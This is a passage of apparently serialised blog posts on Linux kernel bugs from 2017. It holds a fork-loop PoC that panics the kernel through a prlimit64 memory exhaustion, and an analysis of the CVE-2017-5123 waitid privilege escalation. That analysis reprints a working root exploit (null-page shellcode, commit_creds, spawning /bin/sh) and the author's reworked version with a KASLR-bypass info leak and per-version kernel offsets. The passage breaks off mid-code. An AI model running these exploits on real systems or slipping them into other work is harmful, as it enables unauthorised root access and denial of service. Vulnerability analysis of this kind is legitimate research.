unwind_next_frame+0x15a6/0x1e60 arch/x86/kernel/unwind_orc.c:438\r\nRead of size 8 at addr ffff8800762674f0 by task syz-executor3/2870\r\n\r\nCPU: 2 PID: 2870 Comm: syz-executor3 Not tainted 4.15.0-rc3+ #3\r\nHardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Ubuntu-1.8.2-1ubuntu1 04/01/2014\r\nCall Trace:\r\n __dump_stack lib/dump_stack.c:17 [inline]\r\n dump_stack+0x104/0x1cd lib/dump_stack.c:53\r\n print_address_description+0x60/0x224 mm/kasan/report.c:252\r\n kasan_report_error mm/kasan/report.c:351 [inline]\r\n kasan_report+0x16b/0x260 mm/kasan/report.c:409\r\n\r\nThe buggy address belongs to the page:\r\npage:00000000f387e2cc count:0 mapcount:0 mapping:          (null) index:0x0\r\nflags: 0x500000000000000()\r\nraw: 0500000000000000 0000000000000000 0000000000000000 00000000ffffffff\r\nraw: ffffea0001d899e0 ffffea0001d899e0 0000000000000000 0000000000000000\r\npage dumped because: kasan: bad access detected\r\n\r\nMemory state around the buggy address:\r\n ffff880076267380: f2 f2 f2 f2 f2 f2 00 f2 f2 f2 f2 f2 f2 f2 00 00\r\n ffff880076267400: f2 f2 f3 f3 f3 f3 00 00 00 00 00 00 00 00 00 00\r\n>ffff880076267480: 00 00 00 00 00 00 00 00 00 00 00 00 00 f1 f1 f1\r\n                                                             ^\r\n ffff880076267500: f1 f8 f2 f2 f2 f2 f2 f2 f2 f8 f2 f2 f2 f2 f2 f2\r\n ffff880076267580: f2 f8 f2 f2 f2 f2 f2 f2 f2 f8 f2 f2 f2 f2 f2 f2\r\n==================================================================\r\nKernel panic - not syncing: panic_on_warn set ...\r\n\r\nCPU: 2 PID: 2870 Comm: syz-executor3 Tainted: G    B            4.15.0-rc3+ #3\r\nHardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Ubuntu-1.8.2-1ubuntu1 04/01/2014\r\nCall Trace:\r\n __dump_stack lib/dump_stack.c:17 [inline]\r\n dump_stack+0x104/0x1cd lib/dump_stack.c:53\r\n panic+0x1aa/0x39b kernel/panic.c:183\r\n kasan_end_report+0x43/0x49 mm/kasan/report.c:176\r\n kasan_report_error mm/kasan/report.c:356 [inline]\r\n kasan_report.cold.5+0xb5/0xe1 mm/kasan/report.c:409\r\nDumping ftrace buffer:\r\n   (ftrace buffer empty)\r\nKernel Offset: 0x15000000 from 0xffffffff81000000 (relocation range: 0xffffffff80000000-0xffffffffbfffffff)\r\nRebooting in 86400 seconds..\r\n```\r\n\r\n## prlimit64 (leading to kernel panic)\r\n\r\nW4F, not serious :).\r\n\r\nI just found a crash on LK v4.15.x (maybe the most of LKs). It has to happen.\r\nBecause, resizing limitation of MSGQUEUE to **0** and calling socket$xxx repeatedly, as result, occurs OOM (out of memory).\r\n\r\n### PoC\r\n> gcc -o poc -std=c99 poc.c\r\n\r\n```c\r\n#define _GNU_SOURCE \r\n\r\n#include <unistd.h>\r\n\r\n#include <sys/types.h>\r\n#include <sys/syscall.h>\r\n\r\nstatic void test();\r\n\r\nvoid loop() {\r\n\twhile (1) test();\r\n}\r\n\r\nvoid test() {\r\n\tsyscall(__NR_mmap, 0x20000000, 0x9000, 0x3, 0x32, -1, 0);  // just space\r\n\tsyscall(__NR_prlimit64, 0x0, 0x7, 0x20000000, 0x20000000); // 0x7 => RLIMIT_MSGQUEUE\r\n\tsyscall(__NR_socket, 0x2, 0x1, 0x0);                       // socket$inet_tcp\r\n}\r\n\r\nvoid main(int argc, char *argv[], char **envp) {\r\n\tfor (int i = 0; i < 8; ++i) {\r\n\t\tint pid = fork();\r\n\t\tif (pid == 0) {\r\n\t\t\tloop();\r\n\t\t\treturn;\r\n\t\t}\r\n\t}\r\n\r\n\tsleep(1000000); // wait\r\n}\r\n```\r\n\r\n### Call Trace (Dump)\r\n```c\r\n[   61.885712] CPU: 1 PID: 1 Comm: init Not tainted 4.15.0-rc4+ #4\r\n[   61.885987] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Ubuntu-1.8.2-1ubuntu1 04/01/2014\r\n[   61.886426] Call Trace:\r\n[   61.886553]  dump_stack+0x104/0x1cd\r\n[   61.886723]  ? _atomic_dec_and_lock+0x153/0x153\r\n[   61.886945]  panic+0x1aa/0x39b\r\n[   61.887095]  ? add_taint.cold.3+0x16/0x16\r\n[   61.887291]  ? blocking_notifier_call_chain+0xc5/0x160\r\n[   61.887533]  ? srcu_init_notifier_head+0x80/0x80\r\n[   61.887752]  ? rcutorture_record_progress+0x10/0x10\r\n[   61.887981]  ? save_trace+0x2f0/0x2f0\r\n[   61.888170]  out_of_memory.cold.38+0x1e/0x64\r\n[   61.888378]  ? oom_killer_disable+0x2c0/0x2c0\r\n[   61.888604]  ? mutex_trylock+0x1fe/0x260\r\n[   61.888791]  ? __alloc_pages_slowpath+0x119d/0x29c0\r\n[   61.889023]  ? ww_mutex_lock.part.2+0xf0/0xf0\r\n[   61.889243]  ? __alloc_pages_slowpath+0x1f6c/0x29c0\r\n[   61.889481]  ? sched_clock+0x5/0x10\r\n[   61.889656]  ? warn_alloc+0x110/0x110\r\n[   61.889833]  ? lock_downgrade+0x690/0x690\r\n[   61.890028]  ? lock_release+0xff0/0xff0\r\n[   61.890222]  ? radix_tree_lookup_slot+0x91/0xd0\r\n[   61.890439]  ? rcutorture_record_progress+0x10/0x10\r\n[   61.890670]  ? rcu_read_lock_sched_held+0xe4/0x120\r\n[   61.890901]  ? find_get_entry+0x50c/0xa10\r\n[   61.891092]  ? __alloc_pages_slowpath+0x29c0/0x29c0\r\n[   61.891334]  ? __lock_acquire+0x7a7/0x40c0\r\n[   61.891530]  ? debug_check_no_locks_freed+0x200/0x200\r\n[   61.891769]  ? pvclock_read_flags+0x150/0x150\r\n[   61.891977]  ? save_trace+0x2f0/0x2f0\r\n[   61.892163]  ? kvm_sched_clock_read+0x21/0x30\r\n[   61.892370]  ? sched_clock+0x5/0x10\r\n[   61.892538]  ? sched_clock_cpu+0x18/0x170\r\n[   61.892733]  ? kvm_sched_clock_read+0x21/0x30\r\n[   61.892940]  ? sched_clock+0x5/0x10\r\n[   61.893108]  ? find_held_lock+0x39/0x1c0\r\n[   61.893306]  ? __lock_is_held+0xb4/0x140\r\n[   61.893497]  ? rcutorture_record_progress+0x10/0x10\r\n[   61.893736]  ? __alloc_pages_nodemask+0x8e6/0xbc0\r\n[   61.893961]  ? __alloc_pages_slowpath+0x29c0/0x29c0\r\n[   61.894195]  ? find_get_pages_contig+0xf60/0xf60\r\n[   61.894415]  ? deref_stack_reg+0x9b/0x100\r\n[   61.894608]  ? kvm_sched_clock_read+0x21/0x30\r\n[   61.894814]  ? sched_clock+0x5/0x10\r\n[   61.894982]  ? sched_clock_cpu+0x18/0x170\r\n[   61.895178]  ? save_trace+0x2f0/0x2f0\r\n[   61.895354]  ? __lock_acquire+0x7a7/0x40c0\r\n[   61.895560]  ? alloc_pages_current+0xac/0x1e0\r\n[   61.895768]  ? __page_cache_alloc+0x2ed/0x360\r\n[   61.895977]  ? find_held_lock+0x39/0x1c0\r\n[   61.896218]  ? page_endio+0x760/0x760\r\n[   61.896406]  ? filemap_fault+0xd41/0x1930\r\n[   61.896605]  ? __lock_page_or_retry+0x4c0/0x4c0\r\n[   61.896820]  ? rcutorture_record_progress+0x10/0x10\r\n[   61.897048]  ? pvclock_read_flags+0x150/0x150\r\n[   61.897263]  ? filemap_map_pages+0xbe3/0x1350\r\n[   61.897476]  ? __lock_acquire+0x7a7/0x40c0\r\n[   61.897667]  ? find_get_pages_range_tag+0xf10/0xf10\r\n[   61.897899]  ? save_trace+0x2f0/0x2f0\r\n[   61.898074]  ? kvm_sched_clock_read+0x21/0x30\r\n[   61.898289]  ? sched_clock+0x5/0x10\r\n[   61.898461]  ? debug_check_no_locks_freed+0x200/0x200\r\n[   61.898701]  ? save_trace+0x2f0/0x2f0\r\n[   61.898881]  ? find_held_lock+0x39/0x1c0\r\n[   61.899071]  ? ext4_filemap_fault+0x78/0xa7\r\n[   61.899276]  ? lock_acquire+0x15b/0x430\r\n[   61.899461]  ? lock_contended+0xe70/0xe70\r\n[   61.899654]  ? lock_release+0xff0/0xff0\r\n[   61.899849]  ? down_read+0xb5/0x180\r\n[   61.900018]  ? down_write_killable_nested+0x190/0x190\r\n[   61.900269]  ? ext4_filemap_fault+0x80/0xa7\r\n[   61.900468]  ? __do_fault+0xd8/0x360\r\n[   61.900641]  ? print_bad_pte+0x5b0/0x5b0\r\n[   61.900831]  ? pvclock_read_flags+0x150/0x150\r\n[   61.901039]  ? __handle_mm_fault+0x11d9/0x3080\r\n[   61.901255]  ? sched_clock+0x5/0x10\r\n[   61.901422]  ? sched_clock_cpu+0x18/0x170\r\n[   61.901612]  ? find_held_lock+0x39/0x1c0\r\n[   61.901801]  ? vm_insert_mixed_mkwrite+0x30/0x30\r\n[   61.902020]  ? lock_acquire+0x15b/0x430\r\n[   61.902209]  ? lock_downgrade+0x690/0x690\r\n[   61.902401]  ? kvm_sched_clock_read+0x21/0x30\r\n[   61.902607]  ? lock_release+0xff0/0xff0\r\n[   61.902791]  ? do_raw_spin_trylock+0x180/0x180\r\n[   61.903006]  ? _raw_spin_unlock_irqrestore+0x46/0x60\r\n[   61.903245]  ? trace_hardirqs_on_caller+0x381/0x570\r\n[   61.903476]  ? remove_wait_queue+0x188/0x250\r\n[   61.903678]  ? save_trace+0x2f0/0x2f0\r\n[   61.903854]  ? lock_acquire+0x15b/0x430\r\n[   61.904036]  ? __do_page_fault+0x2f6/0xb50\r\n[   61.904225]  ? do_wait+0x425/0xa20\r\n[   61.904389]  ? lock_release+0xff0/0xff0\r\n[   61.904572]  ? wait_consider_task+0x3500/0x3500\r\n[   61.904796]  ? rcu_note_context_switch+0x6e0/0x6e0\r\n[   61.905021]  ? cpu_extra_stat_show+0x10/0x10\r\n[   61.905231]  ? handle_mm_fault+0x12e/0x390\r\n[   61.905429]  ? __do_page_fault+0x4fa/0xb50\r\n[   61.905627]  ? vmalloc_fault+0x930/0x930\r\n[   61.905813]  ? SyS_waitid+0x40/0x40\r\n[   61.905986]  ? do_page_fault+0xb5/0x5b0\r\n[   61.906176]  ? __do_page_fault+0xb50/0xb50\r\n[   61.906372]  ? SYSC_wait4+0x95/0x110\r\n[   61.906543]  ? kernel_wait4+0x330/0x330\r\n[   61.906728]  ? syscall_return_slowpath+0x2cd/0x450\r\n[   61.906957]  ? entry_SYSCALL_64_fastpath+0x4b/0x96\r\n[   61.907192]  ? async_page_fault+0x36/0x60\r\n[   61.907393]  ? trace_hardirqs_off_thunk+0x1a/0x1c\r\n[   61.907618]  ? async_page_fault+0x36/0x60\r\n[   61.907810]  ? async_page_fault+0x4c/0x60\r\n[   61.908170] Kernel Offset: 0x2b200000 from 0xffffffff81000000 (relocation range: 0xffffffff80000000-0xffffffffbfffffff)\r\n[   61.908670] ---[ end Kernel panic - not syncing: Out of memory and no killable processes...\r\n[   61.908670]\r\n```\r\n\r\nAs a result, kernel panic is triggered because of OOM (Out Of Memory).\r\n\r\n**End**\r\n","excerpt":"spin-lock recursion bug (leading to deadlock) There's no recursion check on spinlock where I found it (not exact). So when executed recursi…","fields":{"slug":"/2017-12-LK-Founds/"},"frontmatter":{"date":"Dec 10, 2017","title":"Linux Kernel - 2017-12 Founds","tags":["Security","Linux-Kernel"],"update":"Dec 20, 2017"}}},{"node":{"rawMarkdownBody":"\r\nLinux Kernel waitid() Local Privilege Escalation\r\n\r\n## TL;DR\r\n\r\nSome days ago, i just saw this vulnerability somewhere in google. It's about **Kernel Exploitation, CVE-2017-5123**.\r\nMaybe It works on 4.14.0-rc1 ~ 4.14.0-rc4 and the latest released version is 4.14.0-rc7 and stable build is 4.13.10 (2017/11/2).\r\n\r\nThe reasons for analyzing this vulnerability are 'the payload' and 'the vulnerability'. Because it just triggers *null dereference* which is rarely seen.\r\nSo, I just think that... how could it be? at the first time without seeing any information.\r\nNot only that, but it was also strange that this vulnerability exists in the latest!\r\n\r\n## 1 - day vulnerability : CVE-2017-5123\r\n\r\nLet's see the title first :)\r\n> **Linux Kernel 4.14.0-rc4+ - 'waitid()' Privilege Escalation**\r\n\r\nIt's an LPE(Local Privilege Escalation) using waitid().\r\n\r\nNow, let's see the difference of the codes and commits by version and how it works.\r\n\r\n\r\n## Before\r\n\r\n[Before Commit](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=4c48abe91be03d191d0c20cc755877da2cb35622).\r\n\r\n```c\r\n@@ -1625,15 +1625,18 @@ SYSCALL_DEFINE5(waitid, int, which, pid_t, upid, struct siginfo __user *,\r\n \tif (!infop)\r\n \t\treturn err;\r\n \r\n-\tif (put_user(err ? 0 : SIGCHLD, &infop->si_signo) ||\r\n-\t    put_user(0, &infop->si_errno) ||\r\n-\t    put_user((short)info.cause, &infop->si_code) ||\r\n-\t    put_user(info.pid, &infop->si_pid) ||\r\n-\t    put_user(info.uid, &infop->si_uid) ||\r\n-\t    put_user(info.status, &infop->si_status))\r\n-\t\terr = -EFAULT;\r\n-\r\n+\tuser_access_begin();\r\n+\tunsafe_put_user(err ? 0 : SIGCHLD, &infop->si_signo, Efault);\r\n+\tunsafe_put_user(0, &infop->si_errno, Efault);\r\n+\tunsafe_put_user((short)info.cause, &infop->si_code, Efault);\r\n+\tunsafe_put_user(info.pid, &infop->si_pid, Efault);\r\n+\tunsafe_put_user(info.uid, &infop->si_uid, Efault);\r\n+\tunsafe_put_user(info.status, &infop->si_status, Efault);\r\n+\tuser_access_end();\r\n \treturn err;\r\n+Efault:\r\n+\tuser_access_end();\r\n+\treturn -EFAULT;\r\n }\r\n \r\n static long kernel_wait4(pid_t upid, int __user *stat_addr,\r\n@@ -1736,13 +1739,20 @@ COMPAT_SYSCALL_DEFINE5(waitid,\r\n \t\t\treturn -EFAULT;\r\n \t}\r\n \r\n-\tif (put_user(err ? 0 : SIGCHLD, &infop->si_signo) ||\r\n-\t    put_user(0, &infop->si_errno) ||\r\n-\t    put_user((short)info.cause, &infop->si_code) ||\r\n-\t    put_user(info.pid, &infop->si_pid) ||\r\n-\t    put_user(info.uid, &infop->si_uid) ||\r\n-\t    put_user(info.status, &infop->si_status))\r\n-\t\terr = -EFAULT;\r\n+\tif (!infop)\r\n+\t\treturn err;\r\n+\r\n+\tuser_access_begin();\r\n+\tunsafe_put_user(err ? 0 : SIGCHLD, &infop->si_signo, Efault);\r\n+\tunsafe_put_user(0, &infop->si_errno, Efault);\r\n+\tunsafe_put_user((short)info.cause, &infop->si_code, Efault);\r\n+\tunsafe_put_user(info.pid, &infop->si_pid, Efault);\r\n+\tunsafe_put_user(info.uid, &infop->si_uid, Efault);\r\n+\tunsafe_put_user(info.status, &infop->si_status, Efault);\r\n+\tuser_access_end();\r\n \treturn err;\r\n+Efault:\r\n+\tuser_access_end();\r\n+\treturn -EFAULT;\r\n }\r\n #endif\r\n```\r\n\r\nThis commit is from *Linux Kernel v4.13.x*, In the existing waitid(),\r\n> siginfo __user *\r\n\r\nthere were codes checking it whether user-land or kernel-land address. But it **removed**.\r\nSo, by __user *, kernel-land access could be possible on user-land.\r\n\r\nLet's say from an exploit point of view, waitid() form what we use is\r\n> int waitid(idtype_t idtype, id_t id, siginfo_t *infop, int options);\r\n\r\nlike that. By using *infop*, we can **write** arbitrary value on **arbitrary kernel-land memory** and control it!\r\nI'm out of words :|\r\n\r\n## After\r\n\r\n[After Commit](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=96ca579a1ecc943b75beba58bebb0356f6cc4b51).\r\n\r\n```c\r\ndiff --git a/kernel/exit.c b/kernel/exit.c\r\nindex f2cd53e..cf28528 100644\r\n--- a/kernel/exit.c\r\n+++ b/kernel/exit.c\r\n@@ -1610,6 +1610,9 @@ SYSCALL_DEFINE5(waitid, int, which, pid_t, upid, struct siginfo __user *,\r\n \tif (!infop)\r\n \t\treturn err;\r\n \r\n+\tif (!access_ok(VERIFY_WRITE, infop, sizeof(*infop)))\r\n+\t\tgoto Efault;\r\n+\r\n \tuser_access_begin();\r\n \tunsafe_put_user(signo, &infop->si_signo, Efault);\r\n \tunsafe_put_user(0, &infop->si_errno, Efault);\r\n@@ -1735,6 +1738,9 @@ COMPAT_SYSCALL_DEFINE5(waitid,\r\n \tif (!infop)\r\n \t\treturn err;\r\n \r\n+\tif (!access_ok(VERIFY_WRITE, infop, sizeof(*infop)))\r\n+\t\tgoto Efault;\r\n+\r\n \tuser_access_begin();\r\n \tunsafe_put_user(signo, &infop->si_signo, Efault);\r\n \tunsafe_put_user(0, &infop->si_errno, Efault);\r\n```\r\nNowadays, it just fixed like above.\r\n\r\n## Payload Analysis\r\n\r\nOf course, by above vulnerability, we can trigger that with **several various ways** but let's see 'the orignal' first :)\r\n[payload](https://www.exploit-db.com/exploits/43029/).\r\n\r\n```c\r\n#define _GNU_SOURCE\r\n \r\n#include <stdio.h>\r\n#include <stdlib.h>\r\n#include <unistd.h>\r\n#include <sys/types.h>\r\n#include <sys/wait.h>\r\n#include <sys/mman.h>\r\n#include <string.h>\r\n \r\nstruct cred;\r\nstruct task_struct;\r\n  \r\ntypedef struct cred *(*prepare_kernel_cred_t) (struct task_struct *daemon) __attribute__((regparm(3)));\r\ntypedef int (*commit_creds_t) (struct cred *new) __attribute__((regparm(3)));\r\n  \r\nprepare_kernel_cred_t   prepare_kernel_cred;\r\ncommit_creds_t    commit_creds;\r\n  \r\nvoid get_shell() {\r\n  char *argv[] = {\"/bin/sh\", NULL};\r\n  \r\n  if (getuid() == 0){\r\n    printf(\"[+] Root shell success !! :)\\n\");\r\n    execve(\"/bin/sh\", argv, NULL);\r\n  }\r\n  printf(\"[-] failed to get root shell :(\\n\");\r\n}\r\n  \r\nvoid get_root() {\r\n  if (commit_creds && prepare_kernel_cred)\r\n    commit_creds(prepare_kernel_cred(0));\r\n}\r\n  \r\nunsigned long get_kernel_sym(char *name)\r\n{\r\n  FILE *f;\r\n  unsigned long addr;\r\n  char dummy;\r\n  char sname[256];\r\n  int ret = 0;\r\n  \r\n  f = fopen(\"/proc/kallsyms\", \"r\");\r\n  if (f == NULL) {\r\n    printf(\"[-] Failed to open /proc/kallsyms\\n\");\r\n    exit(-1);\r\n  }\r\n  printf(\"[+] Find %s...\\n\", name);\r\n  while(ret != EOF) {\r\n    ret = fscanf(f, \"%p %c %s\\n\", (void **)&addr, &dummy, sname);\r\n    if (ret == 0) {\r\n      fscanf(f, \"%s\\n\", sname);\r\n      continue;\r\n    }\r\n    if (!strcmp(name, sname)) {\r\n      fclose(f);\r\n      printf(\"[+] Found %s at %lx\\n\", name, addr);\r\n      return addr;\r\n    }\r\n  }\r\n  fclose(f);\r\n  return 0;\r\n}\r\n \r\nint main(int ac, char **av)\r\n{\r\n    if (ac != 2) {\r\n        printf(\"./exploit kernel_offset\\n\");\r\n        printf(\"exemple = 0xffffffff81f3f45a\");\r\n        return EXIT_FAILURE;\r\n    }\r\n \r\n    // 2 - Appel de la fonction get_kernel_sym pour rcuperer dans le /proc/kallsyms les adresses des fonctions\r\n    prepare_kernel_cred = (prepare_kernel_cred_t)get_kernel_sym(\"prepare_kernel_cred\");\r\n    commit_creds = (commit_creds_t)get_kernel_sym(\"commit_creds\");\r\n    // have_canfork_callback offset <= rendre dynamique aussi\r\n     \r\n    pid_t     pid;\r\n    /* siginfo_t info; */\r\n \r\n    // 1 - Mapper la mmoire  l'adresse 0x0000000000000000\r\n    printf(\"[+] Try to allocat 0x00000000...\\n\");\r\n    if (mmap(0, 4096, PROT_READ|PROT_WRITE|PROT_EXEC,MAP_ANON|MAP_PRIVATE|MAP_FIXED, -1, 0) == (char *)-1){\r\n        printf(\"[-] Failed to allocat 0x00000000\\n\");\r\n        return -1;\r\n    }\r\n    printf(\"[+] Allocation success !\\n\");\r\n    /* memset(0, 0xcc, 4096); */\r\n    /*\r\n        movq rax, 0xffffffff81f3f45a\r\n        movq [rax], 0\r\n        mov rax, 0x4242424242424242\r\n        call rax\r\n        xor rax, rax\r\n        ret\r\n        replace 0x4242424242424242 by get_root\r\n    https://defuse.ca/online-x86-assembler.htm#disassembly\r\n    */\r\n    unsigned char shellcode[] = \r\n    { 0x48, 0xC7, 0xC0, 0x5A, 0xF4, 0xF3, 0x81, 0x48, 0xC7, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0xB8, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0xFF, 0xD0, 0x48, 0x31, 0xC0, 0xC3 };\r\n    void **get_root_offset = rawmemchr(shellcode, 0x42);\r\n    (*get_root_offset) = get_root;\r\n \r\n    memcpy(0, shellcode, sizeof(shellcode));\r\n    /* strcpy(0, \"\\x48\\x31\\xC0\\xC3\"); // xor rax, rax; ret */\r\n \r\n    if(-1 == (pid = fork())) {\r\n        perror(\"fork()\");\r\n        return EXIT_FAILURE;\r\n    }\r\n \r\n    if(pid == 0) {\r\n        _exit(0xDEADBEEF);\r\n        perror(\"son\");\r\n        return EXIT_FAILURE;\r\n    }\r\n \r\n    siginfo_t *ptr = (siginfo_t*)strtoul(av[1], (char**)0, 0);\r\n    waitid(P_PID, pid, ptr, WEXITED | WSTOPPED | WCONTINUED);\r\n \r\n    // TRIGGER\r\n    pid = fork();\r\n    printf(\"fork_ret = %d\\n\", pid); \r\n    if (pid > 0)\r\n        get_shell();\r\n    return EXIT_SUCCESS;\r\n}\r\n```\r\nWhat 'the maker' said about that code, in short.\r\n> For exploitation, trigger null dereference.\r\n> Overwrite have_canfork_callback (.bss seg in kernel),\r\n> if have_canfork_callback is set to a value other than 0, unset callback (null) is occurred.\r\n> ...\r\n\r\n## But...\r\n\r\nBut... Let's talk about *my small option* **only about** that *payload*, **Only talk about that payload**, i can say that it's triggered, but... something is missing(?).\r\nOf course maybe, that payload was made for **trigger purposes only**.\r\n\r\nBecause of the testing environments. *KASLR* is off and *mmap min address* is 0 for triggering null dereference.\r\n> -nokaslr\r\n> sysctl -w vm.mmap_min_addr=0\r\n\r\n### 1. KASLR Bypass\r\n\r\nLet's talk about it first, **kernel-land ASLR**, **KASLR** is supported from *linux kernel 4.4*. When we boot with *kaslr option*, then *kaslr* will be applied. If not, *kaslr* is off.\r\nNormally we just boot the OS, then *kaslr* is off.\r\n\r\nAnd another question is below.\r\n```c\r\n    prepare_kernel_cred = (prepare_kernel_cred_t)get_kernel_sym(\"prepare_kernel_cred\");\r\n    commit_creds = (commit_creds_t)get_kernel_sym(\"commit_creds\");\r\n```\r\nThis part from the code is just getting the addresses from */proc/kallsyms*.\r\nBut actually, it does not work as well because if we read the address from */proc/kallsysms* without *root perm* and *kaslr*, the address would be 0.\r\nIn summary,\r\n* with *nokaslr*, **user gets** 0, **root** gets **exact address**.\r\n* with *kaslr*, can read but all time **random address**. (try it yourself!)\r\n\r\nWe can see that below.\r\n```c\r\nzero@ubuntu:~$ uname -a\r\nLinux ubuntu 4.13.8-041308-generic #201710180430 SMP Wed Oct 18 08:33:18 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux\r\nzero@ubuntu:~$ id\r\nuid=1000(zero) gid=1000(zero) groups=1000(zero),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),121(lpadmin),131(sambashare)\r\nzero@ubuntu:~$ cat /proc/kallsyms | grep prepare_kernel_cred\r\n0000000000000000 T prepare_kernel_cred\r\n0000000000000000 r __ksymtab_prepare_kernel_cred\r\n0000000000000000 r __kstrtab_prepare_kernel_cred\r\nzero@ubuntu:~$ sudo su\r\n[sudo] password for zero: \r\nroot@ubuntu:/home/zero# id\r\nuid=0(root) gid=0(root) groups=0(root)\r\nroot@ubuntu:/home/zero# cat /proc/kallsyms | grep prepare_kernel_cred\r\nffffffff8c4a8390 T prepare_kernel_cred\r\nffffffff8d1ac010 r __ksymtab_prepare_kernel_cred\r\nffffffff8d1c6526 r __kstrtab_prepare_kernel_cred\r\nroot@ubuntu:/home/zero# cat /proc/kallsyms | grep prepare_kernel_cred\r\nffffffff8c4a8390 T prepare_kernel_cred\r\nffffffff8d1ac010 r __ksymtab_prepare_kernel_cred\r\nffffffff8d1c6526 r __kstrtab_prepare_kernel_cred\r\nroot@ubuntu:/home/zero#\r\n```\r\n\r\n**So, user-land with nokaslr, we can't get exact address from /proc/kallsysms with user-perm**\r\n\r\n### 2. mmap_min_addr is set to 0\r\n\r\nThis value is set to **65536** by default for protecting from *null dereference*.\r\n(Actually mmap_min_addr is different by platform or OS whatever... ㅇㅅㅇ)\r\n\r\n> root@ubuntu:/etc/sysctl.d# cat *zeropage.conf <br/>\r\n> ... <br/>\r\n> vm.mmap_min_addr = 65536 <br/>\r\n> root@ubuntu:/etc/sysctl.d#  <br/>\r\n\r\n## Then...?\r\n\r\n**It's not related to this vulnerability**, In the wild, for bypassing mitigation and exploiting fully, it's normal that getting at least one more *info leak* is essential on any platforms.\r\n\r\nThat vulnerability let us give *w perm* on *infop* partially, but if there are kaslr and others, then we need to leak *kernel base address* or sth and other sub-works are needed as well.\r\n\r\n## Conclusion\r\n\r\nIt is interesting that this kind of vulnerability in the latest version of Linux Kernel can lead to mistakes yet ;).\r\nAnyway, it's surprising :).\r\n\r\nIn addition 1, **mmap_min_addr** is set to 0, with **nokaslr**, known *prepare_kernel_cred*, *commit_creds* addresses already, so there could be several ways to exploit this vulnerability.\r\n\r\nTry it Yourself :)\r\n\r\nIn addition 2, on *somewhere v4.13.x* when *kaslr* is on, we can bypass *kaslr* with **info leak** by using waitid().\r\n\r\nLastly, I just re-make(?) exploit-code with includding kaslr bypass :).\r\nBut maybe it worked on only *4.13.0 < x <= 4.13.4* and just patched somewhere *4.13.X or 4.14.0-rcX*.\r\n\r\n```c\r\n#define _GNU_SOURCE\r\n\r\n#include <stdio.h>\r\n#include <stdlib.h>\r\n#include <unistd.h>\r\n#include <string.h>\r\n\r\n#include <sys/types.h>\r\n#include <sys/wait.h>\r\n#include <sys/mman.h>\r\n#include <sys/utsname.h>\r\n#include <sys/resource.h>\r\n\r\n#include <syscall.h>\r\n\r\n#define KASLR_BYPASS 1\r\n#define SMEP_SMAP_BYPASS 0\r\n\r\nstruct cred;\r\nstruct task_struct;\r\n\r\ntypedef struct cred *(*prepare_kernel_cred_t)(struct task_struct *daemon)__attribute__((regparm(3)));\r\ntypedef int(*commit_creds_t)(struct cred *new)__attribute__((regparm(3)));\r\n\r\nunsigned long kernel_base = 0;\r\nprepare_kernel_cred_t prepare_kernel_cred;\r\ncommit_creds_t commit_creds;\r\n\r\n// sudo sysctl -w vm.mmap_min_addr=0\r\n// sudo cat /proc/kallsyms | grep _text | head -n 1\r\n\r\nunsigned long k_offset[][4] = {\r\n  { /* Linux Kernel 4.14.0-rc4+ info */ /* trigger! */\r\n    0x753d0,\r\n    0x75050,\r\n    0xf3f45a,\r\n  },\r\n  { /* Linux Kernel 4.14.0-rc4 info */ /* triggered! but process is killed */\r\n    0xaa6a0,\r\n    0xaa310,\r\n    0x106046c,\r\n  },\r\n  { /* Linux Kernel 4.13.0-16 info */ /* not triggered */\r\n    0xa8530,    // prepare_kernel_cred\r\n    0xa81a0,    // commit_creds\r\n    0x105ff2c,  // have_canfork_callback\r\n    0x1e540,    // native_read_cr4\r\n  },\r\n  { /* Linux Kernel 4.13.4 info */ /* trigger! but process is killed */\r\n    0xa8340,\r\n    0xa7fb0,\r\n    0x105fe2c,\r\n  },\r\n  { /* Linux Kernel 4.13.8 info */ /* trigger! but process is killed */\r\n    0xa8390,\r\n    0xa8000,\r\n    0x106042c,\r\n  },\r\n  { /* Linux Kernel 4.13.10 info */ /* not triggered */\r\n    0xa8390,\r\n    0xa8000,\r\n    0x10603ac,\r\n  },\r\n};\r\n\r\nunsigned long user_cs = 0x0;\r\nunsigned long user_ss = 0x0;\r\nunsigned long user_rflags = 0x0;\r\n\r\nvoid backup_stat() {  \r\n    asm(\r\n        \"movq %%cs, %0\\n\"\r\n        \"movq %%ss, %1\\n\"\r\n        \"pushfq\\n\"\r\n        \"popq %2\\n\"\r\n        : \"=r\" (user_cs), \"=r\" (user_ss), \"=r\" (user_rflags) : : \"memory\"\r\n    );\r\n}\r\n\r\nvoid get_shell() { if (getuid() == 0) system(\"/bin/sh\"); }\r\nvoid get_root() { if (commit_creds && prepare_kernel_cred) commit_creds(prepare_kernel_cred(0)); }\r\n\r\nunsigned long kaslr_bypass() {\r\n  pid_t pid = fork();\r\n  if (pid > 0) {\r\n    struct rusage ru = {};\r\n    syscall(__NR_waitid, P_PID, pid, NULL, WEXITED | WNOHANG | __WNOTHREAD, &ru);\r\n\r\n    unsigned long *p = (unsigned long *)&ru;\r\n    for (; p < (unsigned long *)((char *)&ru + sizeof(ru)); ++p)\r\n      if (*p > 0xffffffff00000000 && *p < 0xffffffffff000000)\r\n        return (*p & ~0xfffff) - 0x100000;\r\n  }\r\n  return 0;\r\n}\r\n\r\nint main(int argc, char *argv[]) {\r\n  if (!(argc == 3 || argc == 2)) {\r\n    printf(\"Usage : %s [<kernel_base_addr>] <kernel_version>\\n\", argv[0]);\r\n    return EXIT_SUCCESS;\r\n  }\r\n\r\n  if (argc == 3) kernel_base = (unsigned long)strtoul(argv[1], (char **)0, 0);\r\n  else if (argc == 2) kernel_base = kaslr_bypass();\r\n\r\n  if (kernel_base == 0) {\r\n    printf(\"\\e[31m[-] Failed to leak kernel_base:(\\n\");\r\n    return EXIT_FAILURE;\r\n  }\r\n  \r\n  backup_stat(); /* backup userland env */\r\n  \r\n  struct utsname buf;\r\n  if (!uname(&buf)) printf(\"\\e[36m[*] Kernel Version \\e[34m: %s\\n\", buf.release);\r\n  printf(\"\\e[35m[+] Kernel Base           \\e[34m: %#llx\\n\", (unsigned long 